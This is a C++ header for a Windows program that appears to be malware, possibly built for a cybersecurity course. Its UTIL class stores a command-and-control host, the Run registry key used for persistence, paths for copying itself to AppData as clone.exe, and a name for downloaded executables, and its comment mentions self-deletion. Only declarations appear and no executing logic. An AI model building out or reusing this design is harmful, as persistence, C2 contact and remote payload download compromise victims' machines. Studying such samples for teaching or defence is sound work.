
#pragma once
#include <string>
#include <windows.h>
using namespace std;
/*
	Utility Module:
	Responsible for maintaining and building the various directory paths for self deletion and copy 
*/

class UTIL {
	string path;
	string username;
	string base = "C:\\Users\\";
	string appData = "\\AppData\\Roaming";
	string clone = "\\clone.exe";
	string cloneKeyName = "clone";
	string downloadFileName = "downloaded.exe";
	string downloaded = "\\" + downloadFileName;
	LPCSTR c2host = "www.uvu-cybersecurity.com";
	LPCSTR runKey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
	char filename[MAX_PATH];
	void getModuleName();
	string currentDirectory;

public:
	char* getFileName();
	string getPath();
	string getBase();
	string getAppData();
	string getClone();
	string getCloneKeyName();
	string getDownloaded();
	string getDownloadFileName();
	string getUsername();
	string getAppDataPath();
	string getCurrentDirectory();
	LPCSTR getC2Host();
	LPCSTR getRunKey();
	bool isExecutingFromAppData();
};